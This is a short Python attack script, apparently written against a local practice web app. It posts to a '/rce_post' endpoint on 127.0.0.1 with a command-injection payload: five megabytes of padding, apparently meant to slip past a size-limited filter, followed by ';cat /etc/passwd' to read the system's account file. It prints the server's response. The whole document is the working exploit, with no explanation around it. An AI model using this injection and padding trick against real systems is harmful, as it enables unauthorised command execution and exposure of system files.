import requests

headers = {
    'Host': '127.0.0.1:9004',
    # 'Content-Length': '23',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    # 'Origin': 'http://127.0.0.1:9004',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Referer': 'http://127.0.0.1:9004/',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
    'Connection': 'close',
}
padding_data = 'x' * 1024 * 1024 * 5  # 5 MB 的无用数据

data = {'cmd': 'echo ' + padding_data +';cat /etc/passwd'}


response = requests.post('http://127.0.0.1:9004/rce_post', headers=headers, data=data, verify=False)
print(response.text)    
print(response.status_code)